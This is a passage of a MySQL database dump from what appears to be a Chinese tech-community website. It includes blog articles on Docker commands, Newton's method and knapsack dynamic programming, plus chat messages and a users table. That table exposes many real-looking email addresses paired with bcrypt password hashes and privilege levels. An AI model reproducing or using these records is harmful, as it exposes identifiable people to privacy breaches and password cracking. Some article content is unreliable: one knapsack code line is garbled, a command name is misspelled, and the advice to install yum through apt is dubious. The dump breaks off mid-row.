10.56.53](https://cdn.jsdelivr.net/gh/Markydh/MyPicture@img/img/Screenshot%202024-04-19%20at%2010.56.53.png)\r\n\r\n## 2.2 查看docker 镜像摘要\r\n\r\n```\r\ndocker image ls --digests\r\n```\r\n\r\n## 2.3  镜像、容器、数据卷所占用的空间。\r\n\r\n``` \r\ndocker system df\r\n```\r\n\r\n![Screenshot 2024-04-19 at 11.00.27](https://cdn.jsdelivr.net/gh/Markydh/MyPicture@img/img/Screenshot%202024-04-19%20at%2011.00.27.png)\r\n\r\n# 3 镜像删除\r\n\r\n```\r\ndocker image rm <IMAGE ID>/<IMAGE NAME> <DIGEST>\r\n```\r\n\r\n# 4 容器\r\n\r\n\r\n\r\n## 4.1 列出容器\r\n\r\n### 列出正在运行的容器\r\n\r\n```\r\ndokcer conatiner ls\r\n```\r\n\r\n![Screenshot 2024-04-19 at 11.17.15](https://cdn.jsdelivr.net/gh/Markydh/MyPicture@img/img/Screenshot%202024-04-19%20at%2011.17.15.png)\r\n\r\n### 列出所有状态下的容器（包括终止态的容器）\r\n\r\n![Screenshot 2024-04-19 at 11.18.32](https://cdn.jsdelivr.net/gh/Markydh/MyPicture@img/img/Screenshot%202024-04-19%20at%2011.18.32.png)\r\n\r\n> [!TIP]\r\n>\r\n> 可以看出docker/getting-started 是终止态\r\n>\r\n> \r\n\r\n## 4.2 容器启动\r\n\r\n启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态（`exited`）的容器重新启动。\r\n\r\n因为 Docker 的容器实在太轻量级了，很多时候用户都是随时删除和新创建容器。\r\n\r\n### 新建并启动\r\n\r\n启动一个 bash 终端，允许用户进行交互。\r\n\r\n```\r\ndocker run -i -t  <IMAGE> /bin/bash\r\n```\r\n\r\n其中，`-t` 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， `-i` 则让容器的标准输入保持打开。\r\n\r\n在交互模式下，用户可以通过所创建的终端来输入命令，例如\r\n\r\n![Screenshot 2024-04-19 at 11.13.32](https://cdn.jsdelivr.net/gh/Markydh/MyPicture@img/img/Screenshot%202024-04-19%20at%2011.13.32.png)\r\n\r\n### 启动已中止的容器\r\n\r\n```\r\ndocker container start <CONTAINER ID>\r\n```\r\n\r\n\r\n\r\n# 5 守护态运行\r\n\r\n更多的时候，需要让 Docker 在后台运行而不是直接把执行命令的结果输出在当前宿主机下。此时，可以通过添加 `-d` 参数来实现。\r\n\r\n``` \r\ndocker run -d mysql /bin/sh \r\n```\r\n\r\n# 6 进入容器\r\n\r\n在使用 `-d` 参数时，容器启动后会进入后台。\r\n\r\n某些时候需要进入容器进行操作，包括使用 `docker attach` 命令或 `docker exec` 命令，推荐大家使用 `docker exec` 命令，原因会在下面说明。\r\n\r\n## `attach` 命令\r\n\r\n下面示例如何使用 `docker attach` 命令。\r\n\r\n```\r\n$ docker run -dit ubuntu\r\n243c32535da7d142fb0e6df616a3c3ada0b8ab417937c853a9e1c251f499f550\r\n\r\n$ docker container ls\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n243c32535da7        ubuntu:latest       \"/bin/bash\"         18 seconds ago      Up 17 seconds                           nostalgic_hypatia\r\n\r\n$ docker attach 243c\r\nroot@243c32535da7:/#\r\n```\r\n\r\n*注意：* 如果从这个 stdin 中 exit，会导致容器的停止。\r\n\r\n##  `exec` 命令\r\n\r\n### `-i` `-t` 参数\r\n\r\n`docker exec` 后边可以跟多个参数，这里主要说明 `-i` `-t` 参数。\r\n\r\n只用 `-i` 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。\r\n\r\n当 `-i` `-t` 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。\r\n\r\n复制\r\n\r\n```\r\n$ docker run -dit ubuntu\r\n69d137adef7a8a689cbcb059e94da5489d3cddd240ff675c640c8d96e84fe1f6\r\n\r\n$ docker container ls\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n69d137adef7a        ubuntu:latest       \"/bin/bash\"         18 seconds ago      Up 17 seconds                           zealous_swirles\r\n\r\n$ docker exec -i 69d1 bash\r\nls\r\nbin\r\nboot\r\ndev\r\n...\r\n\r\n$ docker exec -it 69d1 bash\r\nroot@69d137adef7a:/#\r\n```\r\n\r\n如果从这个 stdin 中 exit，不会导致容器的停止。这就是为什么推荐大家使用 `docker exec` 的原因。\r\n\r\n\r\n\r\n# 7 删除\r\n\r\n## 7.1 删除容器\r\n\r\n可以使用 `docker container rm` 来删除一个处于终止状态的容器。例如\r\n\r\n```\r\n$ docker container rm trusting_newton\r\ntrusting_newton\r\n```\r\n\r\n如果要删除一个运行中的容器，可以添加 `-f` 参数。Docker 会发送 `SIGKILL` 信号给容器。\r\n\r\n## 清理所有处于终止状态的容器\r\n\r\n用 `docker container ls -a` 命令可以查看所有已经创建的包括终止状态的容器，如果数量太多要一个个删除可能会很麻烦，用下面的命令可以清理掉所有处于终止状态的容器。\r\n','2024-04-26 11:36:56','2024-04-26 11:36:56'),(100040,100008,'算法小Tip：牛顿迭代法','# 算法小Tip：牛顿迭代法\r\n\r\n原理：\r\n\r\n我们设方程函数f(x)=m,改方程可以转化为g(x)=f(x)−m=0 我们只需要求出函数g(x)=0的解，就可以求出f(x)=m的解。\r\n\r\n牛顿迭代公式：\r\n\r\n![截屏2024-03-02 16.08.59](https://cdn.jsdelivr.net/gh/Markydh/MyPicture@img/img/%E6%88%AA%E5%B1%8F2024-03-02%2016.08.59.png)\r\n\r\n例题：\r\nleetcode-69 x的平方根\r\n\r\n```c++\r\nclass Solution {\r\npublic:\r\n    int mySqrt(int x) {\r\n        if (x == 0) {\r\n            return 0;\r\n        }\r\n\r\n        double C = x, x0 = x;\r\n        while (true) {\r\n            double xi = 0.5 * (x0 + C / x0);\r\n            if (fabs(x0 - xi) < 1e-7) {\r\n                break;\r\n            }\r\n            x0 = xi;\r\n        }\r\n        return int(x0);\r\n    }\r\n};\r\n```\r\n\r\n','2024-04-26 11:41:44','2024-04-26 11:41:44'),(100041,100021,'常见Dp问题汇总','## 动态规划\r\n- __常见类型：__ 背包\r\n    - 0 1背包：每件物品最多只用一次\r\n    - 完全背包：每个物品有无限个\r\n    - 多重背包：每个物品的个数是有限制的，既不是一件也不是无穷件\r\n    - 分组背包：每组选一个\r\n___\r\n<span style=\"color:red\">01背包</span>\r\n- __Dp__:\r\n    - 状态表示：f(i,j)\r\n        - 集合：\r\n            - 所有选法\r\n            - 条件\r\n                - 只从前i个物品中选\r\n                - 总体积<=j\r\n        - 属性：MAX,MIN,数量\r\n    - 状态计算：集合的划分\r\n![集合的划分](https://markydh.cn/image/17c9d3d06656ad94.png)\r\n\r\n###### 01背包模板题\r\n![01背包题目](https://markydh.cn/image/17c9d3f1f6b6e024.png)\r\n```cpp\r\n//二维模拟\r\n#include<iostream>\r\n\r\nusing namespace std;\r\n\r\nconst int N = 1010;\r\n\r\nint n, m;\r\nint v[N], w[N];\r\nint f[N][N];\r\n                                                                                                                      \r\nint main()\r\n{\r\n    cin >> n >> m;\r\n    \r\n    for (int i = 1; i <= n; i ++) cin >> v[i] >> w[i];\r\n    \r\n    for (int i = 1; i <= n; i ++)\r\n        for (int j = 1; j <= m; j ++)\r\n        {\r\n            f[i][j] = f[i - 1]f[j];//不选i\r\n            if (j >= v[i]) f[i][j] = max(f[i][j], f[i - 1][j - v[i]] + w[i]);\r\n        }\r\n        \r\n    cout << f[n][m] <<  endl;\r\n    \r\n    return 0;\r\n}\r\n//二维转一维 时间无法优化，对空间进行优化\r\n#include<iostream>\r\n#include<algorithm>\r\n\r\nusing namespace std;\r\n\r\nconst int N = 1010;\r\n\r\nint n, m;\r\nint v[N], w[N];\r\nint f[N];\r\n\r\nint main()\r\n{\r\n    cin >> n >> m;\r\n    \r\n    for (int i = 1; i <= n; i ++) cin >> v[i] >> w[i];\r\n    \r\n    for (int i = 1; i <= n; i ++)\r\n        for (int j = m; j >= v[i]; j --)\r\n        {\r\n            f[j] = max(f[j], f[j - v[i]] + w[i]);\r\n        }\r\n        //j从大到小才能保证j - v[i]是第i- 1层的结果\r\n    cout << f[m] <<  endl;\r\n    \r\n    return 0;\r\n}\r\n```\r\n___\r\n<span style=\"color:blue\">完全背包</span>\r\n- __Dp__:\r\n    - 状态表示：f(i,j)\r\n        - 集合：\r\n            - 所有选法\r\n            - 条件\r\n                - 只从前i个物品中选\r\n                - 总体积<=j\r\n        - 属性：MAX,MIN,数量:\r\n          - 曲线救国\r\n    - 状态计算：集合的划分\r\n![集合的划分](https://markydh.cn/image/17c9d40aa2302e16.png)\r\n###### 完全背包模板题\r\n![完全背包题目](https://markydh.cn/image/17c9d412ab4b1bc4.png)\r\n```cpp\r\n//朴素算法，暴力枚举\r\n//时间复杂度较高，可能tle\r\n#include <iostream>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nconst int N = 1010;\r\n\r\nint n, m;\r\nint v[N], w[N];\r\nint f[N][N];\r\n\r\nint main()\r\n{\r\n    cin >> n >> m;\r\n    for (int i = 1; i <= n; i ++) cin >> v[i] >> w[i];\r\n    \r\n    for (int i = 1; i <= n; i ++)\r\n        for (int j = 1; j <= m; j ++)\r\n            for (int k = 0; k * v[i] <= j; k ++)\r\n                f[i][j] = max(f[i][j], f[i - 1][j - k * v[i]] + k * w[i]);\r\n    \r\n    cout << f[n][m] << endl;\r\n    \r\n    return 0;\r\n}\r\n```\r\n<span style=\"color:green\">优化：</span>\r\n<span style=\"color:orange\">确切的说完全背包问题是级数的思想</span>\r\n![完全背包优化图解](https://markydh.cn/image/17c9d42556c17ecb.png)\r\n```cpp\r\n#include <iostream>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nconst int N = 1010;\r\n\r\nint n, m;\r\nint v[N], w[N];\r\nint f[N][N];\r\n\r\nint main()\r\n{\r\n    cin >> n >> m;\r\n    for (int i = 1; i <= n; i ++) cin >> v[i] >> w[i];\r\n    \r\n    for (int i = 1; i <= n; i ++)\r\n        for (int j = 1; j <= m; j ++)\r\n        {\r\n            f[i][j] = f[i - 1][j];\r\n            if (j >= v[i]) f[i][j] = max(f[i][j], f[i][j -v[i]] + w[i]);   \r\n        }\r\n    \r\n    cout << f[n][m] << endl;\r\n    \r\n    return 0;\r\n}\r\n```\r\n<span style=\"color:green\">转一维：</span>\r\n```cpp\r\n#include <iostream>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nconst int N = 1010;\r\n\r\nint n, m;\r\nint v[N], w[N];\r\nint f[N];\r\n\r\nint main()\r\n{\r\n    cin >> n >> m;\r\n    for (int i = 1; i <= n; i ++) cin >> v[i] >> w[i];\r\n    \r\n    for (int i = 1; i <= n; i ++)\r\n        for (int j = v[i]; j <= m; j ++)\r\n        {\r\n            //不需要改为从大到小，因为f[j-v[i]]是第i层的，与状态转移方程一致\r\n            f[j] = max(f[j], f[j -v[i]] + w[i]);   \r\n        }\r\n    \r\n    cout << f[m] << endl;\r\n    \r\n    return 0;\r\n}\r\n```\r\n<span style=\"color:blue\">多重背包</span>\r\n- __Dp__:\r\n    - 状态表示：f(i,j)\r\n        - 集合：\r\n            - 所有选法\r\n            - 条件\r\n                - 只从前i个物品中选\r\n                - 总体积<=j\r\n        - 属性：MAX：集合当中每一个选法对应的总价值的最大值\r\n    - 状态计算：集合的划分\r\nf[i][j]=max(f[i][j],f[i-1][j-v[i]*k]+w[i]*k); k = 0,1,2...,s[i]\r\n###### 多重背包模板题\r\n![多重背包题目](https://markydh.cn/image/17c9d42bc2bacdd5.png)\r\n```cpp\r\n//暴力写法\r\n#include <iostream>\r\n#include<algorithm>\r\n\r\nusing namespace std;\r\n\r\nconst int N = 110;\r\n\r\nint n, m;\r\nint v[N], w[N], s[N];\r\nint f[N][N];\r\n\r\nint main()\r\n{\r\n    cin >> n >> m;\r\n    \r\n    for (int i = 1; i <= n; i ++) cin >> v[i] >> w[i] >> s[i];\r\n    \r\n    for (int i = 1; i <= n; i ++)\r\n        for (int j = 1; j <= m; j ++)\r\n            for (int k = 0; k <= s[i] && k * v[i] <= j; k ++)\r\n            f[i][j] = max(f[i][j], f[i - 1][j - v[i] * k] + w[i] * k);\r\n            \r\n    cout << f[n][m] << endl;\r\n    return 0;\r\n}\r\n```\r\n```cpp\r\n//二进制优化 \r\n//把s件物品再分成log s + 1件 转化成01背包\r\n//把一次购买的多个物品看作一个心得商品\r\n#include <iostream>\r\n#include<algorithm>\r\n\r\nusing namespace std;\r\n\r\nconst int N = 25000, M = 2010;\r\n\r\nint n, m;\r\nint v[N], w[N];\r\nint f[M];\r\n\r\nint main()\r\n{\r\n    cin >> n >> m;\r\n    \r\n    int cnt = 0;\r\n    for (int i = 1; i <= n; i ++)\r\n    {\r\n        int a, b, s;\r\n        cin >> a >> b >> s;\r\n        int k = 1;\r\n        while (k <= s)\r\n        {\r\n            cnt ++;\r\n            v[cnt] = a * k;\r\n            w[cnt] = b * k;\r\n            s -= k;\r\n            k *= 2;\r\n        }\r\n        if (s > 0)\r\n        {\r\n            cnt ++;\r\n            v[cnt] = a * s;\r\n            w[cnt] = b * s;\r\n        }\r\n    }\r\n    \r\n    n = cnt;\r\n    \r\n    for (int i = 1; i <= n; i ++)\r\n        for (int j = m; j >= v[i]; j --)\r\n            f[j] = max(f[j], f[j - v[i]] + w[i]);\r\n            \r\n    cout << f[m] << endl;\r\n    \r\n    return 0;\r\n}\r\n```\r\n完全背包问题：枚举第i个物品选几个\r\n分组背包问题：枚举第i组物品选哪个或者不选\r\n热狗划分法哈哈\r\n\r\n二维优化成一维：如果转移用到上一层的状态的话就从大到小枚举体积\r\n如果用的是本层就从小到大枚举体积\r\n###### 分组背包模板题\r\n![分组背包图解](https://markydh.cn/image/17c9d431f1b06464.png)\r\n![分组背包题目](https://markydh.cn/image/17c9d43729b55dab.png)\r\n```cpp\r\n#include <iostream>\r\n#include<algorithm>\r\n\r\nusing namespace std;\r\n\r\nconst int N = 110;\r\n\r\nint n, m;\r\nint v[N][N], w[N][N], s[N];\r\nint f[N];\r\n\r\nint main()\r\n{\r\n    cin >> n >> m;\r\n    \r\n    for (int i = 1; i <= n; i ++)\r\n    {\r\n        cin >> s[i];\r\n        for (int j = 0; j < s[i]; j ++)\r\n            cin >> v[i][j] >> w[i][j];\r\n    }\r\n    \r\n    for (int i = 1; i <= n; i ++)\r\n        for (int j = m; j >= 0; j --)\r\n            for (int k = 0; k < s[i]; k ++)\r\n                if(v[i][k] <= j)\r\n                    f[j] = max(f[j], f[j - v[i][k]] + w[i][k]);\r\n            \r\n    cout << f[m] << endl;\r\n    \r\n    return 0;\r\n}\r\n```\r\n\r\n','2024-04-26 12:30:10','2024-04-26 12:30:10'),(100066,100021,'【Linux】 command “yum” not found','<h2><b> [Linux] command \"yum\" not found</b></h2>\r\n\r\n> ```yum``` 则属于```Redhat```、```Centos```包管理工具\r\n\r\n<b>最终解决方法：</b>\r\n命令输入 ```sudo apt install yum``` 即可','2024-04-26 13:29:20','2024-04-26 13:32:03'),(100067,100025,'Python世界','<center>\r\n<b>\r\n  <h3>Python小故事</h3>\r\n</b>\r\n</center>\r\n\r\n>&emsp;&emsp;在一个充满温馨氛围的咖啡馆里，橙色的灯光柔和地洒在墙上，映衬着墙上挂着的艺术画作。我坐在靠窗的角落里，手里拿着一本书，享受着宁静的午后时光。\r\n&emsp;&emsp;突然，一位年轻人走进了咖啡馆。他身穿轻便的外套，挡风的围巾轻轻摆动，他的脸上带着明媚的笑容。他手里拿着一杯咖啡，热气腾腾，散发着诱人的香气。\r\n&emsp;&emsp;“噢，Python 是一个很棒的选择！”他的声音中充满了兴奋和热情，与周围安静的氛围形成了鲜明的对比。我被他的突然出现所吸引，微微抬起头，与他交换了一笑。\r\n&emsp;&emsp;他走到我身边，轻轻地坐下，放下了咖啡杯。他开始向我分享他最近的项目，他用 Python 构建了一个简单但功能强大的网络爬虫，用于数据分析。他的话语中充满了自豪和激情，仿佛是一个发现了新大陆的探险家。\r\n&emsp;&emsp;我听着他的讲述，心中渐渐涌起了一股兴奋和好奇。他的话语点燃了我对技术探索的热情，让我也想要探索那些未知的领域，寻找其中的乐趣和挑战。在这个宁静的午后，我与这位陌生人的交谈成为了一次意想不到的启发，让我对未来充满了期待和憧憬。\r\n\r\n','2024-04-27 15:07:56','2024-04-27 15:57:04');
/*!40000 ALTER TABLE `articles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `conversations`
--

DROP TABLE IF EXISTS `conversations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `conversations` (
  `id` int NOT NULL AUTO_INCREMENT,
  `author` int NOT NULL,
  `content` varchar(256) NOT NULL,
  `create` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `author` (`author`),
  CONSTRAINT `conversations_ibfk_1` FOREIGN KEY (`author`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=100194 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `conversations`
--

LOCK TABLES `conversations` WRITE;
/*!40000 ALTER TABLE `conversations` DISABLE KEYS */;
INSERT INTO `conversations` VALUES (100166,100020,'大家好，我刚刚发现了这个平台。喜欢这里的氛围，感觉像是科技爱好者的数字绿洲！','2024-04-27 14:30:12'),(100169,100008,'Hello Herry,我是这个网站的作者，希望你能在创客乌托邦感受思想的碰撞！','2024-04-27 14:35:21'),(100182,100020,'各位，想问一下cdm主要是干什么用的','2024-04-27 15:04:42'),(100183,100008,'加速抗攻击','2024-04-27 15:06:32'),(100184,100020,'可以防止ip追查不被发现攻击吗？','2024-04-27 15:07:05'),(100187,100025,'CDM（内容分发网络）本身不是一种用于防止 IP 追查或隐藏攻击者身份的工具。CDM 的主要功能是将内容缓存到全球各地的服务器上，以提高内容的传输速度和可用性，减少网络拥塞，并增加对恶意攻击的抵御能力。','2024-04-27 15:09:55'),(100191,100020,'好嘟，谢谢大佬🙏🙏','2024-04-27 15:11:52'),(100192,100021,'吧啦吧啦噜嘞','2024-04-29 07:20:26');
/*!40000 ALTER TABLE `conversations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `images`
--

DROP TABLE IF EXISTS `images`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `images` (
  `id` int NOT NULL AUTO_INCREMENT,
  `author` int DEFAULT NULL,
  `filename` varchar(64) NOT NULL,
  `create` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `author` (`author`),
  CONSTRAINT `images_ibfk_1` FOREIGN KEY (`author`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=100049 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `images`
--

LOCK TABLES `images` WRITE;
/*!40000 ALTER TABLE `images` DISABLE KEYS */;
INSERT INTO `images` VALUES (100007,100001,'17b9424abbdd5a06.png','2024-03-03 20:53:42'),(100008,100007,'17b998fe919b8826.png','2024-03-04 23:22:33'),(100009,100007,'17b9992105aaac35.png','2024-03-04 23:25:01'),(100010,100007,'17b9992d980181fc.png','2024-03-04 23:25:55'),(100011,100007,'17b99930d1ad6cdd.png','2024-03-04 23:26:09'),(100012,100007,'17b999331c7762f4.png','2024-03-04 23:26:18'),(100013,100007,'17b999353753709a.png','2024-03-04 23:26:27'),(100014,100007,'17b9993c4dcedbb9.png','2024-03-04 23:26:58'),(100016,100008,'17bbbe0232b388c1.png','2024-03-11 23:03:20'),(100017,100008,'17bbe6ed931e2205.png','2024-03-12 11:33:12'),(100018,100008,'17bbe6ff8331aa69.png','2024-03-12 11:34:29'),(100038,100000,'17c4d656d1174c1f.png','2024-04-10 14:10:27'),(100039,100021,'17c9d3d06656ad94.png','2024-04-26 12:20:25'),(100040,100021,'17c9d3f1f6b6e024.png','2024-04-26 12:22:49'),(100041,100021,'17c9d40aa2302e16.png','2024-04-26 12:24:35'),(100042,100021,'17c9d412ab4b1bc4.png','2024-04-26 12:25:10'),(100043,100021,'17c9d42556c17ecb.png','2024-04-26 12:26:30'),(100044,100021,'17c9d42bc2bacdd5.png','2024-04-26 12:26:58'),(100045,100021,'17c9d431f1b06464.png','2024-04-26 12:27:24'),(100046,100021,'17c9d43729b55dab.png','2024-04-26 12:27:47'),(100047,100008,'17ca2ccb427793a8.png','2024-04-27 15:31:00'),(100048,100025,'17ca2de9bf3659f9.png','2024-04-27 15:51:30');
/*!40000 ALTER TABLE `images` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `messages`
--

DROP TABLE IF EXISTS `messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `messages` (
  `id` int NOT NULL AUTO_INCREMENT,
  `author` int NOT NULL,
  `content` varchar(256) NOT NULL,
  `create` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `author` (`author`),
  CONSTRAINT `messages_ibfk_1` FOREIGN KEY (`author`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=100025 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `messages`
--

LOCK TABLES `messages` WRITE;
/*!40000 ALTER TABLE `messages` DISABLE KEYS */;
INSERT INTO `messages` VALUES (100005,100001,'吾辈岂是池中物 一遇风云便化龙','2024-01-19 13:42:35'),(100007,100009,'太强了orz','2024-01-19 16:56:38'),(100013,100001,'长街漫漫终无故人游','2024-02-18 13:47:33'),(100014,100000,'欲买桂花同载酒 终不似 少年游','2024-03-08 22:41:13'),(100016,100007,'得之淡然，失之坦然','2024-03-19 14:56:00'),(100020,100017,'一鸣从此始，相望青云端。','2024-04-07 21:47:02'),(100021,100017,'知君志不小，一举凌鸿鹄。','2024-04-07 21:48:54'),(100023,100022,'人离合，月圆缺，花开花又谢，不愿再相逢。','2024-04-26 12:31:23'),(100024,100026,'秀man 씨~~~','2024-04-28 06:06:51');
/*!40000 ALTER TABLE `messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `avatar` varchar(32) DEFAULT NULL,
  `username` varchar(32) NOT NULL,
  `email` varchar(32) NOT NULL,
  `password` varchar(64) NOT NULL,
  `power` int DEFAULT '0',
  `register` datetime DEFAULT NULL,
  `login` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`),
  UNIQUE KEY `email` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=100279 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (100000,'17caf748c9a882ec.png','ZhuGui','3035486238@qq.com','$2a$04$E3OSBYH11rKL10y85LrGquxwpMGvbDtuUA.SMT4qUXHwAfQI.k/li',3,'2023-12-22 01:31:46','2024-04-30 05:44:17'),(100001,'root.png','LinZui','1822536514@qq.com','$2a$04$3YUl/xLCWdN8xJbT61d7Gep5rPll0pk4r6VkDR0kj6VTEWavUtgdO',0,'2023-12-22 09:11:07','2024-04-23 11:39:57'),(100002,'17ac00685a4a926c.png','sundog','3042088349@qq.com','$2a$04$QksCg0e5FyzhIkx/SgY3x.o0Q00N9/elnY3vF.NeL92IxuxlNQzje',0,'2023-12-22 15:47:01','2024-04-10 16:01:07'),(100003,'17ab2820580be49a.png','cpt1225','2217013491@qq.com','$2a$04$m4ZotzvXWjA4jDgN/4MLke1JzVwGlo.N0./23CUN0IU/jz2.P6X.G',0,'2023-12-22 21:27:59','2024-04-17 15:55:03'),(100004,'17c629110ae67b79.png','joker','2817718472@qq.com','$2a$04$WyNwtmlFrcJ9s.AOLn4Be.9Be9R3O22yhBfCYHsspRJDl.TkxDf0K',0,'2023-12-26 23:07:39','2024-04-14 21:37:44'),(100005,'17ac3f4a54cbcbda.png','minshen','1373923081@qq.com','$2a$04$En9O9qfd2QenqTlXlETZseQREXAjqql1DitfwqKXWjaDQmAGHIuQm',1,'2023-12-26 23:43:15','2024-04-07 13:23:57'),(100006,'17aba44e4d4c8607.png','(T＿T)','517868394@qq.com','$2a$04$iRcSkxMdMmUHOjSY2yhy7.COPRCsIfJEqET0YZh9WoBwoHe4aMdgi',0,'2023-12-29 19:39:53','2024-01-19 13:31:33'),(100007,'17aba83ac789d444.png','Dirac','744100654@qq.com','$2a$04$7acRo4COVY2yU82DtccexukqqkVZ0XUNNc4vJE27V2gdNraw6S1Xy',0,'2023-12-29 22:47:18','2024-03-19 16:12:18'),(100008,'17ca27fcbd41ea71.png','mark_ydh','2247654142@qq.com','$2a$04$zowqxL6.AcL.wmOW5vaBQeI1w/PspC44GYiFpKC7N0p4zoEJdIVtC',3,'2024-01-16 21:17:34','2024-04-30 08:42:54'),(100009,'17abb43dec40b123.png','我是大帅哥','1405082365@qq.com','$2a$04$s7MZh6vbgIY8wyenJlsHsOw9pYJ89ZABrfSSG.RUAgQgy94KNVLkq',1,'2024-01-19 16:50:29','2024-02-20 14:13:22'),(100013,'default.png','Lin_zui','1900048552@qq.com','$2a$04$XSTeaF7LlRCXT71HTB1QBuslTSiOew2sw2BydLAVxrRSZvwcFVWCK',0,'2024-01-22 22:52:03','2024-01-22 22:52:25'),(100014,'17ae7e03966684ea.png','123456789','3072387818@qq.com','$2a$04$VLyIxnbN1PGCPMxJuiAIHeruBynvYUQEov1wlUtnltPcuHd/hDOzK',0,'2024-01-28 18:56:25','2024-01-28 19:07:35'),(100015,'default.png','2907664647','2907664647@qq.com','$2a$04$VvGicWqRW.BtFH/tdtVfs.M64FEpvVqIJ8lvFSpgV2GhOPVEi3tXm',0,'2024-01-28 19:10:08','2024-01-28 19:10:32'),(100016,'default.png','666666','2087721404@qq.com','$2a$04$QAq.xRjB5optxWbkni8gveXFZ9Pao2x59rng3a6Az4505rI98zK/C',0,'2024-02-27 21:04:20','2024-04-15 14:43:42'),(100017,'17c4dd400077de86.png','云岫','1515385981@qq.com','$2a$04$zipBjC3WQAhD6bXoqAWSHuqVDt0RihKo6j2MWd2HyAgE5uxa4rlFC',0,'2024-03-27 19:46:51','2024-04-18 11:06:23'),(100018,'default.png','donglin223','811310290@qq.com','$2a$04$YtUlCLw6vbjRlptRwQGyzeEuzK3/WQINDTfMMyqgKBu0CJ44irw.O',0,'2024-04-11 14:58:05','2024-04-11 14:58:16'),(100019,'default.png','1471564650','1471564650@qq.com','$2a$04$XjoEzcEwdlBe5mKYHsolouIw24XIew3jSsG6hjtUYY79P20BPq4h.',0,'2024-04-14 16:14:08','2024-04-14 16:14:29'),(100020,'default.png','Herry','dianhong.yang.one@gmail.com','$2a$04$R/5QtgmlaS9Y11cCIhElqOraTIlGBiZCTvtynAiY8NjXNQz7wf3hW',0,'2024-04-26 08:08:29','2024-04-30 05:00:10'),(100021,'17c9d7cc25fc934d.png','Jen','2223667909@qq.com','$2a$04$pR9WoLHPUbUgfqFX2BrwG.stz3CO/sot9NqqqsEeMbxcCzazvsG3K',2,'2024-04-26 11:47:07','2024-04-29 07:22:25'),(100022,'17c9d48e01c91fe1.png','Tomcatt','2298834169@qq.com','$2a$04$iM1g4R0HQ/i76UzMBK6Boef7G2Q21s5IE64mKQ83Tjs9lqbCbv9nq',0,'2024-04-26 12:27:06','2024-04-30 08:42:32'),(100023,'default.png','lixb','lixuebing2021@163.com','$2a$04$nCEtjIzTjKqJbthZ6JD.qedYyrW.beI1B/ioGZBadVf9Xbr1/FWGe',2,'2024-04-26 13:02:05','2024-04-26 13:02:13'),(100024,'default.png','Dood','1272199141@qq.com','$2a$04$MbmA6vI0a60OHl1JIg.VtOwrC.AusneHPLarqS7l7tnWih4B9BzXy',0,'2024-04-27 04:09:08','2024-04-30 02:11:05'),(100025,'17caf848bc8fd824.png','Stianyu','2840742396@qq.com','$2a$04$mKMWb/DlqH.IXvvR91s8NeETtLkCdmrRd0kqLn5KJ9FA9gw6YZC1a',2,'2024-04-27 14:47:51','2024-04-30 05:40:03'),(100026,'default.png','19518531841','2710914146@qq.com','$2a$04$eZdK5h2f0LNYPHxlp4kVfujMbGEKtkDhLghEtfGv3pybCsAhw/Vfm',0,'2024-04-28 06:05:14','2024-04-29 05:55:18'),(100028,'default.png','lkang','1526103282@qq.com','$2a$04$7WVfzScRMYZ0JgxMCu5TOe44YXWXwk1TMGKrVmjoAXgDV.lbQsF/a',0,'2024-04-28 06:07:35','2024-04-28 06:07:35'),(100029,'default.png','1746387497','1746387197@qq.com','$2a$04$pxCVyPCXYPo0LxmdE15eIOgjxnmP0z.zasgqOonTI8mEzai1cbV5K',0,'2024-04-28 06:11:30','2024-04-28 06:11:30'),(100030,'default.png','15355121539','2278355218@qq.com','$2a$04$TMR/GTFISuVZFfFfjzjKDO8CQuvaZQU/LcdNkuzYBOPDdg7Ic7xxu',0,'2024-04-28 11:55:48','2024-04-28 